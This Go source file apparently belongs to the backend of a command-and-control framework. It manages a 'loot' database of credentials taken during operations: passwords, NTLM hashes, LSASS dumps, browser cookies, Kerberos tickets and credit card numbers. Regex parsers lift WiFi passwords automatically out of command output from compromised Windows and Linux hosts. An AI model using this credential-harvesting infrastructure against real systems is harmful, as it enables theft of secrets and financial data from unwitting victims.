package api

import (
	"fmt"
	"net/http"
	"regexp"
	"strconv"
	"strings"
	"time"

	"BackendTemplate/pkg/database"
	"BackendTemplate/pkg/errors"
	"github.com/gin-gonic/gin"
)

// ===== Loot 凭据/制品库(功能批) =====
// 集中管理行动中获取的凭据与制品: 手动录入、命令产出自动识别(如 WiFi 密码)、
// 凭据获取制品(LSASS 转储 / DPAPI 主密钥集 / 浏览器凭据与 Cookie，见 cred.go)、
// 截图等制品引用。库表 + CRUD + 按 uid/类型过滤 + 浏览器制品自动拆条入库。

// lootType 合法值校验(V1 枚举,前端过滤 pill 对齐)
var lootTypes = map[string]bool{
	"pwd":    true, // 明文密码
	"hash":   true, // NTLM/哈希
	"domain": true, // 域账号
	"note":   true, // 备忘(密钥/token/连接串等自由文本)
	"dump":   true, // 内存转储制品(LSASS 等;secret 存服务端文件路径,由操作员本地解析)
	"cookie": true, // 浏览器 Cookie(会话材料;secret 存 name=value)
	"ticket": true, // Kerberos 票据缓存(secret 存制品内条目名,本体在制品文件里)
	"card":   true, // 信用卡(secret 存卡号;来自浏览器 Web Data)
}

// lootAuditEvent 战果审计的注入点。
//
// 抽成一个变量而不是直接调 auditLogEvent 的原因：审计日志是**异步批量落盘**的，
// 单测要断言"记了什么"就得等落盘、还可能被后台 worker 的时序干扰。
// 用函数变量留一个缝，测试可以同步捕获参数，断言"记了哪些字段、有没有泄露密钥"，
// 而生产路径仍然走同一个 auditLogEvent。
var lootAuditEvent = auditLogEvent

// ListLoot GET /api/loot?uid=&type=&page=&size=
func ListLoot(c *gin.Context) {
	uid := strings.TrimSpace(c.Query("uid"))
	lootType := strings.TrimSpace(c.Query("type"))
	page, _ := strconv.Atoi(c.DefaultQuery("page", "1"))
	size, _ := strconv.Atoi(c.DefaultQuery("size", "200"))
	if page < 1 {
		page = 1
	}
	if size < 1 || size > 1000 {
		size = 200
	}

	if lootType != "" && lootType != "all" && !lootTypes[lootType] {
		c.JSON(http.StatusBadRequest, gin.H{"error": "type 非法"})
		return
	}
	items, total, err := database.LootStore_().PageFiltered(uid, lootType, (page-1)*size, size)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": errors.SanitizeError(err)})
		return
	}

	// OPSEC P0-2：读取战果要留痕。
	// 这条与 /cred/* 的 CRED_ACCESS 对齐 —— 此前只有"下发提取"被审计，
	// 而"谁把库里的口令翻出来看了"完全没有记录，这是明显的能力缺口。
	// 审计只记筛选条件与条数，**不记 secret 本体**（否则审计日志本身成了泄露面）。
	lootAuditEvent("LOOT_LIST", "SUCCESS",
		fmt.Sprintf("%s 查询战果（uid=%s type=%s 第%d页 返回%d/%d条）",
			operatorFromContext(c), orAll(uid), orAll(lootType), page, len(items), total),
		map[string]interface{}{
			"uid": orAll(uid), "type": orAll(lootType),
			"page": page, "size": size, "returned": len(items), "total": total,
		})

	c.JSON(http.StatusOK, gin.H{"status": http.StatusOK, "data": gin.H{
		"list":  items,
		"total": total,
	}})
}

// orAll 空值在审计里显示成 all，比留空更好读
func orAll(s string) string {
	if strings.TrimSpace(s) == "" {
		return "all"
	}
	return s
}

// AddLoot POST /api/loot { uid, type, user, realm, host, secret, note }
// (operator+: 录入凭据属敏感操作,auditor 只读)
func AddLoot(c *gin.Context) {
	var body database.Loot
	if err := c.ShouldBindJSON(&body); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	body.Id = 0
	body.CreatedAt = time.Now().Format("2006-01-02 15:04:05")
	if body.Type == "" {
		body.Type = "note"
	}
	if !lootTypes[body.Type] {
		c.JSON(http.StatusBadRequest, gin.H{"error": "type 仅支持 pwd/hash/domain/note"})
		return
	}
	if strings.TrimSpace(body.Secret) == "" && strings.TrimSpace(body.Note) == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "secret 与 note 至少填一项"})
		return
	}
	// 保留明文用于回包：Insert 会把 body.Secret 就地换成密文（v1:...），
	// 直接回显会让前端把密文当成口令显示。
	plainSecret := body.Secret
	if _, err := database.LootStore_().Insert(&body); err != nil {
		lootAuditEvent("LOOT_ADD", "FAILURE",
			fmt.Sprintf("%s 录入战果失败（type=%s uid=%s）: %v",
				operatorFromContext(c), body.Type, orAll(body.Uid), err), nil)
		c.JSON(http.StatusInternalServerError, gin.H{"error": "入库失败: " + err.Error()})
		return
	}
	body.Secret = plainSecret
	// 只记"有没有密钥"与元数据，绝不记密钥本身
	lootAuditEvent("LOOT_ADD", "SUCCESS",
		fmt.Sprintf("%s 录入战果（type=%s uid=%s user=%s host=%s 含密钥=%v）",
			operatorFromContext(c), body.Type, orAll(body.Uid), orAll(body.User), orAll(body.Host),
			strings.TrimSpace(body.Secret) != ""),
		map[string]interface{}{
			"uid": orAll(body.Uid), "type": body.Type, "user": orAll(body.User),
			"realm": orAll(body.Realm), "host": orAll(body.Host), "source": orAll(body.Source),
			"has_secret": strings.TrimSpace(body.Secret) != "",
			"has_note":   strings.TrimSpace(body.Note) != "",
		})
	// 回给前端时清掉密文，避免把 v1:... 当成明文回显
	c.JSON(http.StatusOK, gin.H{"status": http.StatusOK, "data": body})
}

// DeleteLoot DELETE /api/loot/:id
func DeleteLoot(c *gin.Context) {
	id, err := strconv.Atoi(c.Param("id"))
	if err != nil || id <= 0 {
		c.JSON(http.StatusBadRequest, gin.H{"error": "id 非法"})
		return
	}
	affected, err := database.LootStore_().DeleteByID(int64(id))
	if err != nil {
		lootAuditEvent("LOOT_DELETE", "FAILURE",
			fmt.Sprintf("%s 删除战果 id=%d 失败: %v", operatorFromContext(c), id, err), nil)
		c.JSON(http.StatusInternalServerError, gin.H{"error": "删除失败: " + err.Error()})
		return
	}
	// 删除是破坏性操作，必须留痕（尤其是"删了哪一条"）
	lootAuditEvent("LOOT_DELETE", "SUCCESS",
		fmt.Sprintf("%s 删除战果 id=%d（影响 %d 条）", operatorFromContext(c), id, affected),
		map[string]interface{}{"id": id, "affected": affected})
	c.JSON(http.StatusOK, gin.H{"status": http.StatusOK})
}

// AddLootIfNotEmpty 命令产出自动入库的公共入口(供回包识别调用;静默失败仅记日志)
func AddLootIfNotEmpty(uid, lootType, user, realm, host, secret, note, source string) {
	if strings.TrimSpace(secret) == "" && strings.TrimSpace(note) == "" {
		return
	}
	if !lootTypes[lootType] {
		lootType = "note"
	}
	// 同一会话重复执行同一条提取命令（如 wifi 连跑两次）时避免重复入库
	item := database.Loot{
		Uid: uid, Type: lootType, User: user, Realm: realm, Host: host,
		Secret: secret, Note: note, Source: source,
	}
	if _, err := database.LootStore_().AddAutoIngest(&item); err != nil {
		// 静默: 自动入库失败不阻断命令回包主链路
		return
	}
}

// ===== 命令产出自动识别（V1：WiFi 配置文件）=====
//
// 按客户端 wifi 命令**自己的输出标记**识别，而不是泛化解析任意 "key: value"——
// 后者会把普通命令输出里的键值对误判成凭据。识别不到时不产生任何写入。
var (
	// Windows：客户端在每个配置前输出 "--- <SSID> ---"
	wifiSectionRe = regexp.MustCompile(`(?m)^---\s*(.+?)\s*---\s*$`)
	// Windows netsh 的密码行（中英文）
	wifiKeyLineRe = regexp.MustCompile(`(?mi)^\s*(?:关键内容|Key Content)\s*:\s*(.*?)\s*$`)
	// Linux NetworkManager 配置
	nmSSIDRe = regexp.MustCompile(`(?m)^ssid\s*=\s*(.+?)\s*$`)
	nmPSKRe  = regexp.MustCompile(`(?m)^psk\s*=\s*(.+?)\s*$`)
)

// IngestLootFromOutput 从一条命令回包中识别可入库的凭据，返回新入库条数。
// 由 main 注入到 command.LootIngestFunc，在命令输出落到 shell 内容之后调用。
func IngestLootFromOutput(uid, output string) int {
	if database.DB() == nil || strings.TrimSpace(output) == "" {
		return 0
	}
	return ingestWindowsWifi(uid, output) + ingestLinuxWifi(uid, output)
}

// ingestWindowsWifi 解析 "=== WiFi Profiles ===" + 每段 "--- SSID ---" 下的
// "关键内容/Key Content : <密码>"。
func ingestWindowsWifi(uid, output string) int {
	if !strings.Contains(output, "=== WiFi Profiles ===") {
		return 0
	}
	marks := wifiSectionRe.FindAllStringSubmatchIndex(output, -1)
	count := 0
	for i, m := range marks {
		ssid := strings.TrimSpace(output[m[2]:m[3]])
		end := len(output)
		if i+1 < len(marks) {
			end = marks[i+1][0]
		}
		section := output[m[1]:end]
		km := wifiKeyLineRe.FindStringSubmatch(section)
		if len(km) < 2 {
			continue
		}
		pwd := strings.TrimSpace(km[1])
		if pwd == "" {
			continue
		}
		AddLootIfNotEmpty(uid, "pwd", "", "", ssid, pwd, "WiFi 配置文件", "wifi")
		count++
	}
	return count
}

// ingestLinuxWifi 解析 NetworkManager 配置（cat 拼接、无块分隔符）：
// 按行扫描，ssid 出现在 psk 之前，用最近一次 ssid 给随后的 psk 配对。
func ingestLinuxWifi(uid, output string) int {
	if !nmPSKRe.MatchString(output) {
		return 0
	}
	lastSSID := ""
	count := 0
	for _, raw := range strings.Split(output, "\n") {
		line := strings.TrimSpace(raw)
		if m := nmSSIDRe.FindStringSubmatch(line); m != nil {
			lastSSID = strings.TrimSpace(m[1])
			continue
		}
		if m := nmPSKRe.FindStringSubmatch(line); m != nil {
			if pwd := strings.TrimSpace(m[1]); pwd != "" {
				AddLootIfNotEmpty(uid, "pwd", "", "", lastSSID, pwd,
					"WiFi 配置文件（NetworkManager）", "wifi")
				count++
			}
			lastSSID = ""
		}
	}
	return count
}
